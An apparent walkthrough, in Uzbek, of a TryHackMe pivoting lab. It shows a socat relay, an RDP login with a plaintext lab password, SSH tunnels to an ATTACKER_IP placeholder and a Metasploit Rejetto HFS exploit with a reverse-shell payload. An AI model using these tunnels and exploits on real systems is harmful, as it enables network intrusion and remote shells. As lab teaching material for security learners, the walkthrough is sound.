

## 🧭 Nega port forwarding kerak?

Ba'zan siz SMB (445), RDP (3389), WinRM (5985) kabi portlarga ulana olmaysiz, chunki:

* 🔒 Tarmoqda firewall bor
* 🌐 Tarmoq segmentatsiyalangan
* 🚫 Sizning "Attacker" kompyuteringiz bevosita ko‘p mashinalarga kira olmaydi

✅ Lekin sizda **THMJMP2** kabi oraliq mashinaga (pivot) kirish bor.

---

## 🚇 1. SSH Tunnel (Tunneling) orqali port o‘tkazish

### 🎯 Maqsad:

**THMJMP2 orqali THMIIS ga RDP bilan ulanib, flag olish.**

---

### 🔁 A. Remote Port Forwarding (RDP uchun)

**Muammo:** Siz attacker kompyuteringizdan THMIIS:3389 ga kira olmaysiz.

✅ Lekin **THMJMP2 → THMIIS:3389** ochiq.

### 🔧 Yechim: `socat` bilan tunnel ochish

```cmd
C:\tools\socat\socat.exe TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

🧠 Bu: THMJMP2 dagi 13389-portni ochib, unga kelgan so‘rovlarni THMIIS:3389 ga uzatadi.

> Eslatma: 3389 port THMJMP2’da RDP uchun ishlatilgan, shuning uchun siz yangi port (masalan 13389) ochasiz.

---

### 💻 Endi attacker kompyuterdan ulanishingiz mumkin:

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

✅ THMIIS ichidagi `t1_thomas.moore` foydalanuvchisining Desktop papkasida flag bor.

---

## 🧨 2. Murakkab eksploitlar uchun port forwarding

### 🎯 Maqsad:

**THMDC ustidagi `Rejetto HFS` eksploitni THMJMP2 orqali o‘tkazish.**

### ⚠️ Muammolar:

1. THMDC:80 → attacker’ga to‘g‘ridan-to‘g‘ri ulanmaydi
2. Payload faqat lokal tarmoqdan qabul qilinadi
3. Sizga **web server** + **listener** + **exploit ulanish** kerak

---

### 🔧 Yechim: 3ta portni tunnel qilish

#### THMJMP2 da SSH bilan tunnel oching:

```bash
ssh tunneluser@ATTACKER_IP \
  -R 8888:thmdc.za.tryhackme.com:80 \       # Rejetto portini attackerga yuborish
  -L *:6666:127.0.0.1:6666 \                # SRVPORT → THMJMP2 → attacker
  -L *:7878:127.0.0.1:7878 \                # Reverse shell listener
  -N
```

> `8888`, `6666`, `7878` portlarni o‘zgartirish mumkin (lekin collision bo‘lmasin).

---

### 🚀 Metasploitni sozlash:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set payload windows/shell_reverse_tcp

set lhost thmjmp2.za.tryhackme.com
set ReverseListenerBindAddress 127.0.0.1
set lport 7878

set srvhost 127.0.0.1
set srvport 6666

set rhosts 127.0.0.1
set rport 8888

exploit
```

---

### 📦 Bu yerda nima bo‘lyapti?

* RHOST=127.0.0.1:8888 → tunnel orqali THMDC:80
* SRVHOST=127.0.0.1:6666 → THMJMP2 ochgan webserver → attacker localhost
* Reverse shell THMJMP2:7878 → tunnel orqali attackerga qaytadi

✅ Agar hammasi to‘g‘ri bajarilsa, `C:\hfs\flag.txt` dan shell orqali flag olasiz.

---

## 🔗 Xulosa

| Usul     | Maqsad                                             |
| -------- | -------------------------------------------------- |
| `socat`  | Tez va oson port forward qilish                    |
| `ssh -R` | Masofadan attacker kompyuterga portni yuborish     |
| `ssh -L` | attacker kompyuter portini oraliq mashinada ochish |
| `-N`     | Shell so‘ramaslik (faqat tunnel ochish uchun)      |

---

Agar sizga quyidagilar kerak bo‘lsa:

* `socat` sozlash scripti
* `proxychains` bilan dinamik tunneling
* `Metasploit` shablonlari
* `pivoting cheat sheet` PDF formatda

